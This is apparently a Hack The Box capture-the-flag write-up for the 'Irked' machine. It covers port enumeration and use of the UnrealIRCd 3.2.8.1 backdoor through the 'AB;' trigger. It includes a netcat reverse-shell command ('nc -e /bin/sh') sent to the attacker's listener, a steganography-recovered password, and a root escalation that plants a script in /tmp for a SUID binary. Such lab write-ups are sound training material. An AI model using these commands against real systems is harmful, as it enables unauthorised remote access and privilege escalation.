---
layout: single
title: Irked Writeup
date: '2020-04-30 15:30:00'
tags:
- hack-the-box
classes: wide
sidebar:
  - title: "Difficulty: Easy"
    image: /images/posts/2020/2020-04-30-irked-writeup/irked_logo.png
    text: "https://app.hackthebox.eu/machines/163"
typora-copy-images-to: ../../images/posts/2020/${filename}/
---

A pretty easy box that reinforces the use of basic techniques.…

## Enumeration

Starting with the usual Autorecon we turn up the following
```
    22/tcp open ssh syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    80/tcp open http syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
    111/tcp open rpcbind syn-ack ttl 63 2-4 (RPC #100000)
    6697/tcp open irc syn-ack ttl 63 UnrealIRCd
    8067/tcp open irc syn-ack ttl 63 UnrealIRCd
    54513/tcp open status syn-ack ttl 63 1 (RPC #100024)
    65534/tcp open irc syn-ack ttl 63 UnrealIRCd
```
Given the name of the server I was pretty much banking on seeing IRC running, and so wasn't disappointed.

Picking one of the UnrealIRCd ports, 6697, I tried telnetting in to see if it really was IRC running, which it was. It's pretty easy to interact with a IRC server over telnet, so I registered with the server to get a bit more information from it
```bash
    telnet 10.10.10.117 6697
    Trying 10.10.10.117...
    Connected to 10.10.10.117.
    Escape character is '^]'.
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
    :irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
    nick b0b
    user b0b 0 * :b0b
    :irked.htb 001 b0b :Welcome to the ROXnet IRC Network b0b!b0b@10.10.14.15
    :irked.htb 002 b0b :Your host is irked.htb, running version Unreal3.2.8.1
```

From this we can see the server is running _Unreal3.2.8.1_. A quick look on ExploitDB turns up [https://www.exploit-db.com/exploits/13853](https://www.exploit-db.com/exploits/13853) which makes use of a backdoor that was introduced into the source.

The backdoor is very easy to exploit, you just need to send `AB;` and then whatever shell commands you want to execute.

I decided to try a lazy approach first and fired up a listener with `nc -lvp 1234` and then ran `nc 10.10.10.117 6697`. Once the `nc` connected to the server I sent the command `nc -e /bin/sh 10.10.14.12 1234`. Being lazy paid off in this case as `nc` was installed on the box and so I then had a shell as the ircd user.

A quick look around the filesystem turned up the user `djmardov`. Looking in `/home/djmardov` I had a nose in the `Documents` directory. I couldn't view `user.txt` but the file `.backup` looked interesting.

![Annotation-2020-04-30-150422](../../images/posts/2020/2020-04-30-irked-writeup/Annotation-2020-04-30-150422.png)

This seems to be a reference to [Steganograph](https://en.wikipedia.org/wiki/Steganography)y. First I installed `steghide` with `sudo apt install steghide` and then had a look for a picture. From the earlier `nmap` I remembered that a webserver was listening and so that seemed a good place to start.

![Annotation-2020-04-30-150422a](../../images/posts/2020/2020-04-30-irked-writeup/Annotation-2020-04-30-150422a.png)


There was indeed an image on the site, irked.jpg. I grabbed this and then ran
```bash
    steghide extract -sf irked.jpg
    Enter passphrase:
    wrote extracted data to "pass.txt".
    
    cat pass.txt
    Kab6h+m+bbp2J:HG
```
Good stuff. Taking the lazy option I tried this password over ssh `ssh djmardov@10.10.10.117`

and I was in. It was then a quick job to get `user.txt`

![Annotation-2020-04-30-150422b](../../images/posts/2020/2020-04-30-irked-writeup/Annotation-2020-04-30-150422b.png)

## Escalating privileges

### Enumeration

Now that we have an interactive session as a different users it's time to redo enumeration. Looking at processes running and services listening there wasn't really anything sticking out. Given that there wasn't anything obvious it was time to use [LinEnum](https://github.com/rebootuser/LinEnum). I used `scp` to copy this across and then kicked it off

![Annotation-2020-04-30-150422c](../../images/posts/2020/2020-04-30-irked-writeup/Annotation-2020-04-30-150422c.png)

Looking through the report a _suid_ file with a fairly recent changed date. Given the box was released on 17 Nov 2018 it seemed worth a look

![Annotation-2020-04-30-150422d](../../images/posts/2020/2020-04-30-irked-writeup/Annotation-2020-04-30-150422d.png)

### Exploitation

When you run the program it tries to access `/tmp/listusers` which doesn't exist. Copying the file to my local machine and then running it using `ltrace` shows the following:

![Annotation-2020-04-30-150422e](../../images/posts/2020/2020-04-30-irked-writeup/Annotation-2020-04-30-150422e.png)

The program first calls the `who` command using system. It then sets its userid (uid) to 0, which is root. It then tries to execute the contents of `/tmp/listusers`. This means if we put some shell commands in this files they should be executed as root.

To do this we `vi /tmp/listusers` and put in the following
```bash
    #!/bin/bash
    echo "shell?"
    /bin/bash
```
We then run `chmod u+x /tmp/listusers` to make the file executable. The `echo "shell?"` is just so we can tell if the script is executed if we don't get a shell for some reason.

Running `/usr/bin/viewuser` does indeed give us a root shell and we can quickly grab the flag

![Annotation-2020-04-30-150422f](../../images/posts/2020/2020-04-30-irked-writeup/Annotation-2020-04-30-150422f-6947874.png)

